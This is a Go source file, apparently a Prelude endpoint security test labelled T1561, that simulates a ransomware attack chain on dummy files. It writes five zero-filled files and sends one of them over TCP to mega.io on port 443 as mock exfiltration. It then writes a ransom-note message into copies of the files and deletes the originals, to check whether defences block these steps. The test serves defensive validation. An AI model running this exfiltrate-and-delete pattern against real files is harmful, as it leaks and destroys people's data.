/*
ID: ca46a569-1a13-4a9c-bf04-fe19257266ef
NAME: S(C)wipe
TECHNIQUE: T1561
UNIT: response
CREATED: 2023-09-25 15:32:12.690109
*/
package main

import (
	"os"

	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
	Network "github.com/preludeorg/libraries/go/tests/network"
)

var files = []string{
	"one.txt",
	"two.pdf",
	"three.xlsx",
	"four.csv",
	"five.doc",
}

func createTestFiles() {
	Endpoint.Say("Creating test files")
	for _, file := range files {
		Endpoint.Write(file, make([]byte, 2*1024*1024)) // 2MB file size
	}
}

func exfiltrateFiles() {
	Endpoint.Say("Exfiltrating file")

	file := "two.pdf"
	contents := Endpoint.Read(file)
	err := Network.TCP("mega.io", "443", contents)
	if err != nil {
		Endpoint.Say("Failed to exfiltrate file")
		Endpoint.Stop(Endpoint.NetworkConnectionBlocked)
	}
}

func ransomFiles() {
	Endpoint.Say("Creating safe mode copies of files")

	ransomNote := `
Your computer has been hacked.
Your files have not been encrypted. Your computer would have caught that.
Your computer did not catch me.
`

	for _, file := range files {
		safePath := file + ".safe"
		Endpoint.Write(safePath, []byte(ransomNote))
	}
}

func deleteFiles() {
	Endpoint.Say("Deleting original files")
	for _, file := range files {
		err := os.Remove(file)
		if err != nil {
			Endpoint.Say("Blocked from removing files")
			Endpoint.Stop(Endpoint.ExecutionPrevented)
		}
	}
}

func test() {
	createTestFiles()
	exfiltrateFiles()
	ransomFiles()
	deleteFiles()

	Endpoint.Stop(Endpoint.Unprotected)
}

func main() {
	Endpoint.Start(test)
}
